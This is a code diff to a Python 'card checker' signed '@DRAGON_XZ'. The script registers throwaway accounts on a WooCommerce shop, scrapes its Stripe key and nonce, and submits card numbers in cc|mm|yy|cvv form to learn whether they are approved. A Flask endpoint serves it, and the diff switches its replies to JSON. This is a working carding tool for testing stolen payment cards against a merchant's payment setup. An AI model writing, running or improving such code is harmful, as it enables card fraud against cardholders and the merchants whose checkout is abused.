@@ -18,10 +18,10 @@ def register_user():
     fname, lname, email, password = generate_user()
     res = session.get(f"{domain}/my-account/")
     soup = BeautifulSoup(res.text, "html.parser")
-    
+
     nonce_input = soup.find("input", {"name": "woocommerce-register-nonce"})
     referer_input = soup.find("input", {"name": "_wp_http_referer"})
-    
+
     if not nonce_input or not referer_input:
         # Check if already logged in or page structure changed
         if "logout" in res.text.lower():
@@ -99,31 +99,25 @@ def start_checker(card_input):
     try:
         card, month, year, cvv = card_input.split("|")
     except ValueError:
-        return "❌ Invalid card format. Use cc|mm|yy|cvv"
-        
+        return json.dumps({"Response": "Invalid card format. Use cc|mm|yy|cvv", "Status": "false", "Gateway": "Validation", "By": "@DRAGON_XZ"})
+
     register_user()
     stripe_pk, nonce = get_stripe_key_and_nonce()
     pm_id = create_payment_method(stripe_pk, card, month, year, cvv)
     if not pm_id:
-        return "❌ Failed to create Payment Method"
+        return json.dumps({"Response": "Failed to create Payment Method", "Status": "false", "Gateway": "Stripe API", "By": "@DRAGON_XZ"})
 
     result = confirm_setup(pm_id, nonce)
 
     try:
         rjson = json.loads(result)
         if rjson.get("success") and rjson["data"].get("status") == "succeeded":
-            return f"""Status: Approved
-Response: Payment method added successfully
-By: @DRAGON_XZ"""
+            return json.dumps({"Response": "Payment method added successfully", "Status": "true", "Gateway": "Stripe Auth", "By": "@DRAGON_XZ"})
         else:
             msg = rjson.get("data", {}).get("error", {}).get("message", result)
-            return f"""Status: Declined
-Response: {msg}
-By: @DRAGON_XZ"""
+            return json.dumps({"Response": msg, "Status": "false", "Gateway": "Stripe Auth", "By": "@DRAGON_XZ"})
     except:
-        return f"""Status: Declined
-Response: {result}
-By: @DRAGON_XZ"""
+        return json.dumps({"Response": result, "Status": "false", "Gateway": "Stripe Auth", "By": "@DRAGON_XZ"})
 
 from flask import Flask, request
 app = Flask(__name__)
@@ -132,9 +126,9 @@ app = Flask(__name__)
 def check_card_endpoint():
     card_str = request.args.get('card')
     if not card_str:
-        return "Please provide a card parameter", 400
+        return json.dumps({"Response": "Please provide a card parameter", "Status": "false", "Gateway": "Validation", "By": "@DRAGON_XZ"}), 400
     result = start_checker(card_str)
-    return result
+    return result, 200, {'Content-Type': 'application/json'}
 
 if __name__ == "__main__":
     import sys
